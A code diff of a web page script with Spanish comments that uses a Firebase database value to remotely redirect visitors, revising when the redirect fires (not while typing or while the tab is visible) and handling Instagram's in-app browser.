@@ -355,7 +355,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-   <script>
+  <script>
     function detectarInstagram() {
         return navigator.userAgent.includes("Instagram");
     }
@@ -382,41 +382,36 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     }
 
     let urlActual = limpiarURL(window.location.href);
-    let redireccionando = false;
-    let usuarioInteractuando = false; // Evita recargar mientras el usuario usa la página
+    let usuarioActivo = true;  // Variable para controlar si el usuario está interactuando
 
-    // Detectar si el usuario está activo en la página
-    function usuarioActivo() {
-        return document.visibilityState === "visible";
+    // Detectar actividad del usuario
+    function usuarioEstaInteractuando() {
+        return document.activeElement.tagName === "INPUT" || 
+               document.activeElement.tagName === "TEXTAREA" || 
+               document.activeElement.contentEditable === "true";
     }
 
+    // Detectar si la pestaña está activa o inactiva
     document.addEventListener("visibilitychange", () => {
-        if (document.visibilityState === "hidden") {
-            usuarioInteractuando = false; // Si el usuario cambia de pestaña, permitir redirección
-        }
+        usuarioActivo = document.visibilityState === "visible";
     });
 
-    // Detectar actividad en el formulario
-    document.addEventListener("focusin", () => usuarioInteractuando = true);
-    document.addEventListener("focusout", () => usuarioInteractuando = false);
-
-    // Escuchar cambios en la redirección en Firebase
+    // Escuchar cambios en Firebase
     database.ref("redireccion").on("value", (snapshot) => {
-        if (redireccionando || usuarioInteractuando || !usuarioActivo()) return; // No redirigir si el usuario usa la página
-
         const nuevaURL = snapshot.val();
         console.log("🔄 Firebase detectó cambio:", nuevaURL);
 
-        if (nuevaURL && limpiarURL(nuevaURL) !== urlActual) {
-            redireccionando = true; 
+        // Evitar redirecciones si el usuario está escribiendo o la pestaña está activa
+        if (!nuevaURL || limpiarURL(nuevaURL) === urlActual || usuarioEstaInteractuando() || usuarioActivo) {
+            console.log("🛑 No redirigiendo porque el usuario está activo.");
+            return;
+        }
 
-            if (detectarInstagram()) {
-                console.log("📱 Detectado Instagram, forzando recarga total...");
-                location.replace(nuevaURL + "?nocache=" + new Date().getTime());
-            } else {
-                console.log("🚀 Redirigiendo normalmente...");
-                location.replace(nuevaURL);
-            }
+        console.log("🚀 Redirigiendo a:", nuevaURL);
+        if (detectarInstagram()) {
+            location.replace(nuevaURL + "?nocache=" + new Date().getTime());
+        } else {
+            location.replace(nuevaURL);
         }
     }, (error) => {
         console.error("❌ Error al obtener redirección:", error);
